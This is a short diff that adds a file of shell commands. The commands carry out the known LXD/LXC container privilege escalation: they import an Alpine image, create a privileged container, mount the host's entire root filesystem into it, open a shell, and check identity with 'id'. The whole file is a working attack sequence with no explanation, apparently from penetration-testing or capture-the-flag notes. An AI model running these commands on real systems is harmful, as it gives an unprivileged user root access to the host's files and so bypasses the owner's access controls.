@@ -1,0 +1,9 @@
+lxc image import ./alpine-v3.12-x86_64-20200703_0717.tar.gz --alias hell
+
+
+
+lxc init hell ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+id
